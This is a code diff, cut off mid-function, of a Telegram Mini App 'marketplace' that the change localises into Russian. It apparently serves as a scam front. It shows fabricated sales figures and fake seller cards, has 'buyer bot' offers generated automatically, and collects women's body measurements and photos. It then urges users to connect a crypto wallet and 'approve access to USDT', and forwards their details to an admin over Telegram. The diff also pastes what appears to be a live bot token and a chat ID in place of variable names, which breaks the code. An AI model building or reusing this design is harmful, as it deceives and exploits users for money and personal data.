@@ -1,11 +1,11 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <title>Marketplace TMA</title>
-/* version: 1 */
-<!-- Increment the version number above whenever you update the code to force Telegram WebView cache refresh -->
+<!-- version: 3 -->
+<!-- Увеличивайте цифру version каждый раз, когда меняете код. Это помогает Telegram сбросить кэш WebView. -->
 <style>
   :root {
     --bg1: #0b0b1a;
@@ -17,30 +17,40 @@
     --muted: #8a8a9a;
     --card: #1a1a2e;
     --danger: #e74c3c;
-    --success: #2ecc71;
   }
-  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+
+  * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    -webkit-tap-highlight-color: transparent;
+  }
+
   html, body {
     height: 100%;
+    width: 100%;
+    overflow-x: hidden;
     background: linear-gradient(160deg, var(--bg1), var(--bg2), var(--bg3));
     color: var(--text);
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-    overflow-x: hidden;
   }
+
   body {
     display: flex;
     justify-content: center;
     min-height: 100vh;
   }
+
   .app {
     width: 100%;
     max-width: 420px;
     min-height: 100vh;
     position: relative;
     padding-bottom: 40px;
+    overflow-x: hidden;
   }
 
-  /* Ticker */
+  /* Бегущая строка */
   .ticker-wrap {
     position: fixed;
     top: 0;
@@ -54,12 +64,14 @@
     display: flex;
     align-items: center;
   }
+
   .ticker {
     display: flex;
     white-space: nowrap;
-    animation: scroll 90s linear infinite;
+    animation: scroll 80s linear infinite;
     will-change: transform;
   }
+
   .ticker span {
     color: var(--yellow);
     font-size: 13px;
@@ -67,16 +79,18 @@
     text-shadow: 0 0 8px rgba(255, 217, 102, 0.7), 0 0 16px rgba(255, 217, 102, 0.4);
     padding: 0 6px;
   }
+
   .ticker .sep {
     color: rgba(255, 217, 102, 0.45);
     font-weight: 400;
   }
+
   @keyframes scroll {
     0% { transform: translateX(0); }
     100% { transform: translateX(-50%); }
   }
 
-  /* Profile circle */
+  /* Круг регистрации / профиля */
   .profile-area {
     margin-top: 56px;
     display: flex;
@@ -84,6 +98,7 @@
     align-items: center;
     padding: 12px 0 8px;
   }
+
   .profile-circle {
     width: 90px;
     height: 90px;
@@ -99,18 +114,24 @@
     position: relative;
     transition: transform 0.15s ease;
   }
-  .profile-circle:active { transform: scale(0.96); }
+
+  .profile-circle:active {
+    transform: scale(0.96);
+  }
+
   .profile-circle img {
     width: 100%;
     height: 100%;
     object-fit: cover;
   }
+
   .profile-circle .icon-svg {
     width: 42px;
     height: 42px;
     fill: var(--accent);
     opacity: 0.9;
   }
+
   .profile-label {
     margin-top: 8px;
     font-size: 14px;
@@ -122,6 +143,7 @@
     overflow: hidden;
     text-overflow: ellipsis;
   }
+
   .badge {
     position: absolute;
     top: -4px;
@@ -139,21 +161,25 @@
     padding: 0 6px;
     box-shadow: 0 0 8px rgba(231, 76, 60, 0.6);
   }
-  .badge.show { display: flex; }
 
-  /* Sellers */
+  .badge.show {
+    display: flex;
+  }
+
+  /* Заголовок и сетка продавцов */
   .section-title {
     padding: 16px 16px 10px;
     font-size: 18px;
     font-weight: 700;
-    letter-spacing: 0.3px;
   }
+
   .sellers-grid {
     display: grid;
     grid-template-columns: repeat(3, 1fr);
     gap: 12px;
     padding: 0 12px 24px;
   }
+
   .seller-card {
     background: var(--card);
     border-radius: 12px;
@@ -164,6 +190,7 @@
     pointer-events: none;
     border: 1px solid rgba(255,255,255,0.04);
   }
+
   .seller-photo {
     width: 64px;
     height: 64px;
@@ -177,6 +204,7 @@
     margin-bottom: 8px;
     border: 1px solid rgba(255,255,255,0.06);
   }
+
   .seller-name {
     font-size: 12px;
     text-align: center;
@@ -188,7 +216,7 @@
     white-space: nowrap;
   }
 
-  /* Modals */
+  /* Модальные окна */
   .modal-overlay {
     position: fixed;
     inset: 0;
@@ -197,11 +225,12 @@
     display: none;
     align-items: flex-end;
     justify-content: center;
-    padding: 0;
   }
+
   .modal-overlay.show {
     display: flex;
   }
+
   .modal {
     background: linear-gradient(180deg, #1c1c32, #141428);
     width: 100%;
@@ -212,20 +241,24 @@
     padding: 20px 18px 28px;
     animation: slideUp 0.28s ease;
   }
+
   @keyframes slideUp {
     from { transform: translateY(100%); }
     to { transform: translateY(0); }
   }
+
   .modal-header {
     display: flex;
     justify-content: space-between;
     align-items: center;
     margin-bottom: 18px;
   }
+
   .modal-title {
     font-size: 18px;
     font-weight: 700;
   }
+
   .modal-close {
     width: 32px;
     height: 32px;
@@ -239,6 +272,7 @@
     align-items: center;
     justify-content: center;
   }
+
   .btn {
     display: block;
     width: 100%;
@@ -249,21 +283,22 @@
     font-weight: 600;
     cursor: pointer;
     margin-top: 12px;
-    transition: opacity 0.15s;
   }
-  .btn:active { opacity: 0.85; }
+
+  .btn:active {
+    opacity: 0.85;
+  }
+
   .btn-primary {
     background: linear-gradient(135deg, #9b59b6, #8e44ad);
     color: #fff;
   }
+
   .btn-secondary {
     background: rgba(255,255,255,0.08);
     color: var(--text);
   }
-  .btn-danger {
-    background: var(--danger);
-    color: #fff;
-  }
+
   .role-btn {
     background: var(--card);
     border: 1px solid rgba(155,89,182,0.35);
@@ -276,19 +311,20 @@
     cursor: pointer;
     text-align: center;
   }
-  .role-btn:active { background: #22223a; }
 
-  /* Form */
   .form-group {
     margin-bottom: 14px;
   }
+
   .form-group label {
     display: block;
     font-size: 12px;
     color: var(--muted);
     margin-bottom: 5px;
   }
-  .form-group input, .form-group select {
+
+  .form-group input,
+  .form-group select {
     width: 100%;
     padding: 12px 14px;
     border-radius: 10px;
@@ -298,22 +334,23 @@
     font-size: 15px;
     outline: none;
   }
-  .form-group input:focus, .form-group select:focus {
-    border-color: var(--accent);
-  }
+
   .form-row {
     display: flex;
     gap: 10px;
   }
-  .form-row .form-group { flex: 1; }
 
-  /* Photo upload */
+  .form-row .form-group {
+    flex: 1;
+  }
+
   .photo-slots {
     display: flex;
     gap: 10px;
     margin: 16px 0;
     justify-content: center;
   }
+
   .photo-slot {
     width: 90px;
     height: 90px;
@@ -324,22 +361,24 @@
     align-items: center;
     justify-content: center;
     overflow: hidden;
-    position: relative;
   }
+
   .photo-slot img {
     width: 100%;
     height: 100%;
     object-fit: cover;
   }
+
   .photo-slot .placeholder {
     font-size: 11px;
     color: var(--muted);
     text-align: center;
-    padding: 4px;
   }
+
   .photo-input-hidden {
     display: none;
   }
+
   .hint {
     font-size: 12px;
     color: var(--muted);
@@ -347,48 +386,51 @@
     margin-bottom: 10px;
   }
 
-  /* Offers */
   .offer-item {
     background: var(--card);
     border-radius: 12px;
     padding: 14px;
     margin-bottom: 12px;
-    border: 1px solid rgba(255,255,255,0.05);
   }
+
   .offer-header {
     display: flex;
     align-items: center;
     gap: 10px;
     margin-bottom: 8px;
   }
+
   .offer-avatar {
     width: 40px;
     height: 40px;
     border-radius: 50%;
     background: #12122a;
     overflow: hidden;
-    flex-shrink: 0;
     display: flex;
     align-items: center;
     justify-content: center;
     font-size: 11px;
     color: var(--muted);
   }
+
   .offer-avatar img {
     width: 100%;
     height: 100%;
     object-fit: cover;
   }
+
   .offer-name {
     font-weight: 600;
     font-size: 14px;
   }
+
   .offer-msg {
     font-size: 13px;
     color: var(--muted);
     line-height: 1.4;
     margin-bottom: 10px;
   }
+
   .empty-state {
     text-align: center;
     padding: 30px 10px;
@@ -396,7 +438,6 @@
     font-size: 14px;
   }
 
-  /* Wallet */
   .wallet-info {
     font-size: 13px;
     color: var(--muted);
@@ -414,7 +455,11 @@
     align-items: center;
     justify-content: center;
   }
-  .loading-overlay.show { display: flex; }
+
+  .loading-overlay.show {
+    display: flex;
+  }
+
   .spinner {
     width: 40px;
     height: 40px;
@@ -423,7 +468,10 @@
     border-radius: 50%;
     animation: spin 0.7s linear infinite;
   }
-  @keyframes spin { to { transform: rotate(360deg); } }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
 </style>
 </head>
 <body>
@@ -447,103 +495,103 @@
   <div class="sellers-grid" id="sellersGrid"></div>
 </div>
 
-<!-- Role selection modal -->
+<!-- Модальное окно выбора роли -->
 <div class="modal-overlay" id="roleModal">
   <div class="modal">
     <div class="modal-header">
-      <div class="modal-title">Choose role</div>
+      <div class="modal-title">Выберите роль</div>
       <button class="modal-close" data-close="roleModal">×</button>
     </div>
-    <div class="role-btn" id="btnSeller">I am a seller</div>
-    <div class="role-btn" id="btnBuyer">I am a buyer</div>
+    <div class="role-btn" id="btnSeller">Я продавец</div>
+    <div class="role-btn" id="btnBuyer">Я покупатель</div>
   </div>
 </div>
 
-<!-- Seller registration form -->
+<!-- Форма регистрации продавца -->
 <div class="modal-overlay" id="regModal">
   <div class="modal">
     <div class="modal-header">
-      <div class="modal-title">Seller registration</div>
+      <div class="modal-title">Регистрация продавца</div>
       <button class="modal-close" data-close="regModal">×</button>
     </div>
     <div class="form-group">
-      <label>Name</label>
-      <input type="text" id="regName" placeholder="Your name" maxlength="40">
+      <label>Имя</label>
+      <input type="text" id="regName" placeholder="Ваше имя" maxlength="40">
     </div>
     <div class="form-row">
       <div class="form-group">
-        <label>Age</label>
+        <label>Возраст</label>
         <input type="number" id="regAge" placeholder="22" min="18" max="99">
       </div>
       <div class="form-group">
-        <label>Country</label>
-        <input type="text" id="regCountry" placeholder="Country" maxlength="40">
+        <label>Страна</label>
+        <input type="text" id="regCountry" placeholder="Страна" maxlength="40">
       </div>
     </div>
     <div class="form-row">
       <div class="form-group">
-        <label>Height (cm)</label>
+        <label>Рост (см)</label>
         <input type="number" id="regHeight" placeholder="170" min="140" max="220">
       </div>
       <div class="form-group">
-        <label>Weight (kg)</label>
+        <label>Вес (кг)</label>
         <input type="number" id="regWeight" placeholder="55" min="40" max="150">
       </div>
     </div>
     <div class="form-row">
       <div class="form-group">
-        <label>Bust</label>
-        <input type="text" id="regBust" placeholder="e.g. C" maxlength="10">
+        <label>Бюст</label>
+        <input type="text" id="regBust" placeholder="например C" maxlength="10">
       </div>
       <div class="form-group">
-        <label>Parameters</label>
+        <label>Параметры</label>
         <input type="text" id="regParams" placeholder="90-60-90" maxlength="20">
       </div>
     </div>
-    <button class="btn btn-primary" id="regContinue">Continue to photos</button>
+    <button class="btn btn-primary" id="regContinue">Продолжить к фото</button>
   </div>
 </div>
 
-<!-- Photo upload modal -->
+<!-- Загрузка фото -->
 <div class="modal-overlay" id="photoModal">
   <div class="modal">
     <div class="modal-header">
-      <div class="modal-title">Upload photos</div>
+      <div class="modal-title">Загрузка фотографий</div>
       <button class="modal-close" data-close="photoModal">×</button>
     </div>
-    <p class="hint">Select at least 3 photos from your gallery</p>
+    <p class="hint">Выберите минимум 3 фотографии из галереи</p>
     <div class="photo-slots" id="photoSlots">
-      <div class="photo-slot" data-idx="0"><span class="placeholder">Photo 1</span></div>
-      <div class="photo-slot" data-idx="1"><span class="placeholder">Photo 2</span></div>
-      <div class="photo-slot" data-idx="2"><span class="placeholder">Photo 3</span></div>
+      <div class="photo-slot" data-idx="0"><span class="placeholder">Фото 1</span></div>
+      <div class="photo-slot" data-idx="1"><span class="placeholder">Фото 2</span></div>
+      <div class="photo-slot" data-idx="2"><span class="placeholder">Фото 3</span></div>
     </div>
     <input type="file" id="photoInput" class="photo-input-hidden" accept="image/*" multiple>
-    <button class="btn btn-secondary" id="btnSelectPhotos">Select photos</button>
-    <button class="btn btn-primary" id="btnConfirmPhotos" disabled>Confirm & Register</button>
+    <button class="btn btn-secondary" id="btnSelectPhotos">Выбрать фотографии</button>
+    <button class="btn btn-primary" id="btnConfirmPhotos" disabled>Подтвердить и зарегистрироваться</button>
   </div>
 </div>
 
-<!-- Offers modal -->
+<!-- Предложения -->
 <div class="modal-overlay" id="offersModal">
   <div class="modal">
     <div class="modal-header">
-      <div class="modal-title">Offers</div>
+      <div class="modal-title">Предложения</div>
       <button class="modal-close" data-close="offersModal">×</button>
     </div>
     <div id="offersList"></div>
   </div>
 </div>
 
-<!-- Wallet modal -->
+<!-- Подключение кошелька -->
 <div class="modal-overlay" id="walletModal">
   <div class="modal">
     <div class="modal-header">
-      <div class="modal-title">Connect wallet</div>
+      <div class="modal-title">Подключение кошелька</div>
       <button class="modal-close" data-close="walletModal">×</button>
     </div>
-    <p class="wallet-info">Before proceeding, connect your crypto wallet.<br>Approve access to your USDT to continue.</p>
+    <p class="wallet-info">Перед продолжением подключите криптокошелёк.<br>Подтвердите доступ к USDT.</p>
     <div class="form-group">
-      <label>Network</label>
+      <label>Сеть</label>
       <select id="walletNetwork">
         <option value="Ethereum">Ethereum</option>
         <option value="BSC">BSC</option>
@@ -551,10 +599,10 @@
       </select>
     </div>
     <div class="form-group">
-      <label>Wallet address</label>
-      <input type="text" id="walletAddress" placeholder="0x... or T..." maxlength="64">
+      <label>Адрес кошелька</label>
+      <input type="text" id="walletAddress" placeholder="0x... или T..." maxlength="64">
     </div>
-    <button class="btn btn-primary" id="btnApprove">Approve</button>
+    <button class="btn btn-primary" id="btnApprove">Подтвердить</button>
   </div>
 </div>
 
@@ -563,34 +611,26 @@
 </div>
 
 <script>
-/* version: 1 */
 /*
-  CONFIGURATION
-  -------------
-  Fill these values to enable admin notifications and optional JSONBin sync.
-  Leave empty strings to run fully offline (localStorage only).
+  НАСТРОЙКИ
+  ---------
+  Заполните эти поля, если хотите получать уведомления в Telegram
+  и использовать JSONBin. Если оставить пустыми — приложение
+  будет работать полностью локально (через localStorage).
 
-  BOT_TOKEN       - Telegram Bot token from @BotFather
-  ADMIN_CHAT_ID   - Your Telegram chat/user ID that receives notifications
-  JSONBIN_API_KEY - X-Master-Key from jsonbin.io
-  JSONBIN_BIN_ID  - Bin ID that stores { profiles, buyerProfiles, settings }
-
-  JSONBin expected structure:
-  {
-    "profiles": [ { id, name, age, country, height, weight, bust, params, photos:[], wallet:null, offers:[], role:"seller", lastOfferAt:0 } ],
-    "buyerProfiles": [ { id, name, photo:"", message:"" } ],
-    "settings": { adminWallets: { TRC20:"", ERC20:"" } }
-  }
+  BOT_TOKEN       — токен бота от @BotFather
+  ADMIN_CHAT_ID   — ваш числовой ID в Telegram
+  JSONBIN_API_KEY — ключ X-Master-Key с сайта jsonbin.io
+  JSONBIN_BIN_ID  — идентификатор бина
 */
-const BOT_TOKEN = "";
-const ADMIN_CHAT_ID = "";
+const 8321043451:AAFkPYQUfofdsb7dbKBaZpxpJ3o55YHN9W8 = "";
+const 8696933754 = "";
 const JSONBIN_API_KEY = "";
 const JSONBIN_BIN_ID = "";
 
 const STORAGE_KEY = "tma_marketplace_user_v1";
 const LAST_OFFER_KEY = "tma_last_auto_offer_ts";
 
-// Hardcoded list of 100 female names
 const FEMALE_NAMES = [
   "Emma","Olivia","Ava","Isabella","Sophia","Mia","Charlotte","Amelia","Harper","Evelyn",
   "Abigail","Emily","Elizabeth","Sofia","Avery","Ella","Scarlett","Grace","Chloe","Victoria",
@@ -604,18 +644,26 @@ const FEMALE_NAMES = [
   "Katherine","Gianna","Sarah","Alexandra","Melanie","Jasmine","Morgan","Andrea","Lauren","Julia"
 ];
 
-// State
 let userProfile = null;
 let buyerProfiles = [];
 let pendingDealBuyer = null;
 let selectedPhotos = [null, null, null];
-let photoFiles = [];
 
-// ---------- Utils ----------
-function $(id) { return document.getElementById(id); }
-function showModal(id) { $(id).classList.add("show"); }
-function hideModal(id) { $(id).classList.remove("show"); }
-function showLoading(v) { $("loadingOverlay").classList.toggle("show", !!v); }
+function $(id) {
+  return document.getElementById(id);
+}
+
+function showModal(id) {
+  $(id).classList.add("show");
+}
+
+function hideModal(id) {
+  $(id).classList.remove("show");
+}
+
+function showLoading(visible) {
+  $("loadingOverlay").classList.toggle("show", !!visible);
+}
 
 function randInt(min, max) {
   return Math.floor(Math.random() * (max - min + 1)) + min;
@@ -633,8 +681,12 @@ function shuffle(arr) {
 function loadUser() {
   try {
     const raw = localStorage.getItem(STORAGE_KEY);
-    if (raw) userProfile = JSON.parse(raw);
-  } catch (e) { userProfile = null; }
+    if (raw) {
+      userProfile = JSON.parse(raw);
+    }
+  } catch (e) {
+    userProfile = null;
+  }
 }
 
 function saveUser() {
@@ -653,12 +705,14 @@ function generateTickerAmounts() {
 
 function buildTicker() {
   const amounts = generateTickerAmounts();
-  const parts = amounts.map(a => `Lot sold for $${a}`);
-  // Duplicate for seamless loop
+  const parts = amounts.map(function(a) {
+    return "Lot sold for $" + a;
+  });
   const full = parts.concat(parts);
-  const html = full.map((t, i) => {
-    return `<span>${t}</span><span class="sep"> • </span>`;
-  }).join("");
+  let html = "";
+  for (let i = 0; i < full.length; i++) {
+    html += "<span>" + full[i] + "</span><span class=\"sep\"> • </span>";
+  }
   $("ticker").innerHTML = html;
 }
 
@@ -669,16 +723,12 @@ function buildSellersGrid() {
   for (let i = 0; i < 100; i++) {
     const card = document.createElement("div");
     card.className = "seller-card";
-    card.innerHTML = `
-      <div class="seller-photo">Photo</div>
-      <div class="seller-name">${names[i % names.length]}</div>
-    `;
+    card.innerHTML = "<div class=\"seller-photo\">Photo</div><div class=\"seller-name\">" + names[i % names.length] + "</div>";
     grid.appendChild(card);
   }
 }
 
 function updateProfileUI() {
-  const circle = $("profileCircle");
   const label = $("profileLabel");
   const img = $("profileImg");
   const icon = $("defaultIcon");
@@ -694,7 +744,7 @@ function updateProfileUI() {
       img.style.display = "none";
       icon.style.display = "block";
     }
-    const unread = (userProfile.offers || []).filter(o => !o.read).length;
+    const unread = (userProfile.offers || []).filter(function(o) { return !o.read; }).length;
     if (unread > 0) {
       badge.textContent = unread > 99 ? "99+" : unread;
       badge.classList.add("show");
@@ -709,7 +759,6 @@ function updateProfileUI() {
   }
 }
 
-// ---------- Telegram ----------
 function initTelegram() {
   try {
     if (window.Telegram && window.Telegram.WebApp) {
@@ -723,9 +772,9 @@ function initTelegram() {
 }
 
 async function notifyAdmin(text) {
-  if (!8321043451:AAFkPYQUfofdsb7dbKBaZpxpJ3o55YHN9W8 || !8696933754) return;
+  if (!BOT_TOKEN || !ADMIN_CHAT_ID) return;
   try {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
@@ -734,23 +783,19 @@ async function notifyAdmin(text) {
         parse_mode: "HTML"
       })
     });
-  } catch (e) {
-    console.warn("Admin notify failed", e);
-  }
+  } catch (e) {}
 }
 
-// ---------- JSONBin (optional, non-blocking) ----------
 async function fetchJsonBin() {
   if (!JSONBIN_API_KEY || !JSONBIN_BIN_ID) return null;
   try {
-    const res = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
+    const res = await fetch("https://api.jsonbin.io/v3/b/" + JSONBIN_BIN_ID + "/latest", {
       headers: { "X-Master-Key": JSONBIN_API_KEY }
     });
     if (!res.ok) return null;
     const data = await res.json();
     return data.record || null;
   } catch (e) {
-    console.warn("JSONBin fetch failed", e);
     return null;
   }
 }
@@ -758,7 +803,7 @@ async function fetchJsonBin() {
 async function saveJsonBin(record) {
   if (!JSONBIN_API_KEY || !JSONBIN_BIN_ID) return;
   try {
-    await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
+    await fetch("https://api.jsonbin.io/v3/b/" + JSONBIN_BIN_ID, {
       method: "PUT",
       headers: {
         "Content-Type": "application/json",
@@ -766,20 +811,16 @@ async function saveJsonBin(record) {
       },
       body: JSON.stringify(record)
     });
-  } catch (e) {
-    console.warn("JSONBin save failed", e);
-  }
+  } catch (e) {}
 }
 
-// ---------- Auto offers ----------
 function maybeGenerateOffer() {
   if (!userProfile || userProfile.role !== "seller") return;
   if (!buyerProfiles || buyerProfiles.length === 0) return;
 
   const lastTs = parseInt(localStorage.getItem(LAST_OFFER_KEY) || "0", 10);
   const now = Date.now();
-  const thirtyMin = 30 * 60 * 1000;
-  if (now - lastTs < thirtyMin) return;
+  if (now - lastTs < 30 * 60 * 1000) return;
 
   const bot = buyerProfiles[Math.floor(Math.random() * buyerProfiles.length)];
   if (!userProfile.offers) userProfile.offers = [];
@@ -797,7 +838,6 @@ function maybeGenerateOffer() {
   updateProfileUI();
 }
 
-// ---------- UI handlers ----------
 function openProfileOrRegister() {
   if (userProfile && userProfile.role === "seller") {
     openOffers();
@@ -811,33 +851,34 @@ function openOffers() {
   const list = $("offersList");
   const offers = userProfile.offers || [];
   if (offers.length === 0) {
-    list.innerHTML = `<div class="empty-state">No offers yet.<br>Check back later.</div>`;
+    list.innerHTML = "<div class=\"empty-state\">Пока нет предложений.<br>Загляните позже.</div>";
   } else {
-    list.innerHTML = offers.map((o, idx) => {
-      const avatar = o.buyerPhoto
-        ? `<img src="${o.buyerPhoto}" alt="">`
-        : "Photo";
-      return `
-        <div class="offer-item">
-          <div class="offer-header">
-            <div class="offer-avatar">${avatar}</div>
-            <div class="offer-name">${escapeHtml(o.buyerName)}</div>
-          </div>
-          <div class="offer-msg">${escapeHtml(o.message)}</div>
-          <button class="btn btn-primary" style="margin-top:0;padding:10px;" data-offer-idx="${idx}">Make offer</button>
-        </div>
-      `;
-    }).join("");
-    list.querySelectorAll("[data-offer-idx]").forEach(btn => {
-      btn.addEventListener("click", () => {
-        const idx = parseInt(btn.getAttribute("data-offer-idx"), 10);
+    let html = "";
+    for (let i = 0; i < offers.length; i++) {
+      const o = offers[i];
+      const avatar = o.buyerPhoto ? "<img src=\"" + o.buyerPhoto + "\" alt=\"\">" : "Photo";
+      html += "<div class=\"offer-item\">" +
+        "<div class=\"offer-header\">" +
+          "<div class=\"offer-avatar\">" + avatar + "</div>" +
+          "<div class=\"offer-name\">" + escapeHtml(o.buyerName) + "</div>" +
+        "</div>" +
+        "<div class=\"offer-msg\">" + escapeHtml(o.message) + "</div>" +
+        "<button class=\"btn btn-primary\" style=\"margin-top:0;padding:10px;\" data-offer-idx=\"" + i + "\">Сделать предложение</button>" +
+      "</div>";
+    }
+    list.innerHTML = html;
+    const buttons = list.querySelectorAll("[data-offer-idx]");
+    for (let b = 0; b < buttons.length; b++) {
+      buttons[b].addEventListener("click", function() {
+        const idx = parseInt(this.getAttribute("data-offer-idx"), 10);
         handleMakeOffer(offers[idx]);
       });
-    });
+    }
   }
-  // Mark all as read
   if (userProfile.offers) {
-    userProfile.offers.forEach(o => o.read = true);
+    for (let i = 0; i < userProfile.offers.length; i++) {
+      userProfile.offers[i].read = true;
+    }
     saveUser();
     updateProfileUI();
   }
@@ -856,7 +897,7 @@ function escapeHtml(str) {
 function handleMakeOffer(offer) {
   if (!userProfile.wallet || !userProfile.wallet.address) {
     pendingDealBuyer = offer;
-    alert("To proceed, connect your crypto wallet.");
+    alert("Чтобы продолжить, подключите криптокошелёк.");
     hideModal("offersModal");
     showModal("walletModal");
     return;
@@ -866,14 +907,13 @@ function handleMakeOffer(offer) {
 
 async function processDeal(offer) {
   showLoading(true);
-  const text = `🔔 <b>Deal request</b>\nSeller: ${userProfile.name}\nBuyer bot: ${offer.buyerName}\nWallet: ${userProfile.wallet.network} / ${userProfile.wallet.address}`;
+  const text = "🔔 <b>Запрос на сделку</b>\nПродавец: " + userProfile.name + "\nПокупатель: " + offer.buyerName + "\nКошелёк: " + userProfile.wallet.network + " / " + userProfile.wallet.address;
   await notifyAdmin(text);
   showLoading(false);
-  alert("Offer sent successfully! Admin has been notified.");
+  alert("Предложение успешно отправлено! Администратор уведомлён.");
   pendingDealBuyer = null;
 }
 
-// Registration flow
 function startSellerReg() {
   hideModal("roleModal");
   showModal("regModal");
@@ -888,13 +928,25 @@ function continueToPhotos() {
   const bust = $("regBust").value.trim();
   const params = $("regParams").value.trim();
 
-  if (!name || name.length < 2) { alert("Please enter your name"); return; }
-  if (!age || age < 18) { alert("Age must be 18+"); return; }
+  if (!name || name.length < 2) {
+    alert("Пожалуйста, укажите имя");
+    return;
+  }
+  if (!age || age < 18) {
+    alert("Возраст должен быть не менее 18 лет");
+    return;
+  }
 
   userProfile = {
     id: "u_" + Date.now(),
     role: "seller",
-    name, age, country, height, weight, bust, params,
+    name: name,
+    age: age,
+    country: country,
+    height: height,
+    weight: weight,
+    bust: bust,
+    params: params,
     photos: [],
     wallet: null,
     offers: [],
@@ -902,7 +954,6 @@ function continueToPhotos() {
   };
 
   selectedPhotos = [null, null, null];
-  photoFiles = [];
   renderPhotoSlots();
   hideModal("regModal");
   showModal("photoModal");
@@ -910,51 +961,52 @@ function continueToPhotos() {
 
 function renderPhotoSlots() {
   const slots = $("photoSlots").querySelectorAll(".photo-slot");
-  slots.forEach((slot, i) => {
+  for (let i = 0; i < slots.length; i++) {
     if (selectedPhotos[i]) {
-      slot.innerHTML = `<img src="${selectedPhotos[i]}" alt="">`;
+      slots[i].innerHTML = "<img src=\"" + selectedPhotos[i] + "\" alt=\"\">";
     } else {
-      slot.innerHTML = `<span class="placeholder">Photo ${i + 1}</span>`;
+      slots[i].innerHTML = "<span class=\"placeholder\">Фото " + (i + 1) + "</span>";
     }
-  });
-  const count = selectedPhotos.filter(Boolean).length;
+  }
+  const count = selectedPhotos.filter(function(p) { return !!p; }).length;
   $("btnConfirmPhotos").disabled = count < 3;
 }
 
 function handlePhotoSelect(e) {
   const files = Array.from(e.target.files || []);
   if (files.length === 0) return;
-  const readers = files.slice(0, 3).map(file => {
-    return new Promise(resolve => {
+
+  const readers = files.slice(0, 3).map(function(file) {
+    return new Promise(function(resolve) {
       const reader = new FileReader();
-      reader.onload = () => resolve(reader.result);
+      reader.onload = function() { resolve(reader.result); };
       reader.readAsDataURL(file);
     });
   });
-  Promise.all(readers).then(results => {
-    results.forEach((data, i) => {
-      if (i < 3) selectedPhotos[i] = data;
-    });
+
+  Promise.all(readers).then(function(results) {
+    for (let i = 0; i < results.length && i < 3; i++) {
+      selectedPhotos[i] = results[i];
+    }
     renderPhotoSlots();
   });
   e.target.value = "";
 }
 
 async function confirmPhotos() {
-  const count = selectedPhotos.filter(Boolean).length;
+  const count = selectedPhotos.filter(function(p) { return !!p; }).length;
   if (count < 3) {
-    alert("Please select at least 3 photos");
+    alert("Пожалуйста, выберите минимум 3 фотографии");
     return;
   }
-  userProfile.photos = selectedPhotos.filter(Boolean);
+  userProfile.photos = selectedPhotos.filter(function(p) { return !!p; });
   saveUser();
   hideModal("photoModal");
   updateProfileUI();
 
-  const text = `🆕 <b>New seller registered</b>\nName: ${userProfile.name}\nAge: ${userProfile.age}\nCountry: ${userProfile.country || "-"}`;
+  const text = "🆕 <b>Новый продавец зарегистрирован</b>\nИмя: " + userProfile.name + "\nВозраст: " + userProfile.age + "\nСтрана: " + (userProfile.country || "-");
   notifyAdmin(text);
 
-  // Optional: push to JSONBin
   try {
     const remote = await fetchJsonBin();
     if (remote) {
@@ -979,7 +1031,6 @@ async function confirmPhotos() {
   } catch (e) {}
 }
 
-// Wallet
 function openWalletForBuyer() {
   hideModal("roleModal");
   showModal("walletModal");
@@ -989,31 +1040,32 @@ async function approveWallet() {
   const network = $("walletNetwork").value;
   const address = $("walletAddress").value.trim();
   if (!address || address.length < 10) {
-    alert("Please enter a valid wallet address");
+    alert("Пожалуйста, введите корректный адрес кошелька");
     return;
   }
+
   showLoading(true);
-  await new Promise(r => setTimeout(r, 1000)); // simulate approve
+  await new Promise(function(r) { setTimeout(r, 1000); });
 
   if (!userProfile) {
     userProfile = {
       id: "buyer_" + Date.now(),
       role: "buyer",
       name: "Buyer",
-      wallet: { network, address },
+      wallet: { network: network, address: address },
       createdAt: Date.now()
     };
   } else {
-    userProfile.wallet = { network, address };
+    userProfile.wallet = { network: network, address: address };
   }
   saveUser();
   showLoading(false);
   hideModal("walletModal");
 
-  const text = `💼 <b>Wallet connected</b>\nRole: ${userProfile.role}\nName: ${userProfile.name || "-"}\nNetwork: \( {network}\nAddress: <code> \){address}</code>`;
+  const text = "💼 <b>Кошелёк подключён</b>\nРоль: " + userProfile.role + "\nИмя: " + (userProfile.name || "-") + "\nСеть: " + network + "\nАдрес: <code>" + address + "</code>";
   await notifyAdmin(text);
 
-  alert("Wallet connected successfully!");
+  alert("Кошелёк успешно подключён!");
 
   if (pendingDealBuyer && userProfile.role === "seller") {
     processDeal(pendingDealBuyer);
@@ -1021,40 +1073,44 @@ async function approveWallet() {
   updateProfileUI();
 }
 
-// ---------- Bootstrap ----------
 function bindEvents() {
   $("profileCircle").addEventListener("click", openProfileOrRegister);
 
-  document.querySelectorAll("[data-close]").forEach(btn => {
-    btn.addEventListener("click", () => hideModal(btn.getAttribute("data-close")));
-  });
+  const closeButtons = document.querySelectorAll("[data-close]");
+  for (let i = 0; i < closeButtons.length; i++) {
+    closeButtons[i].addEventListener("click", function() {
+      hideModal(this.getAttribute("data-close"));
+    });
+  }
 
   $("btnSeller").addEventListener("click", startSellerReg);
   $("btnBuyer").addEventListener("click", openWalletForBuyer);
   $("regContinue").addEventListener("click", continueToPhotos);
-  $("btnSelectPhotos").addEventListener("click", () => $("photoInput").click());
+  $("btnSelectPhotos").addEventListener("click", function() {
+    $("photoInput").click();
+  });
   $("photoInput").addEventListener("change", handlePhotoSelect);
   $("btnConfirmPhotos").addEventListener("click", confirmPhotos);
   $("btnApprove").addEventListener("click", approveWallet);
 
-  // Close modals on overlay click
-  ["roleModal","regModal","photoModal","offersModal","walletModal"].forEach(id => {
-    $(id).addEventListener("click", e => {
-      if (e.target === $(id)) hideModal(id);
+  const modalIds = ["roleModal", "regModal", "photoModal", "offersModal", "walletModal"];
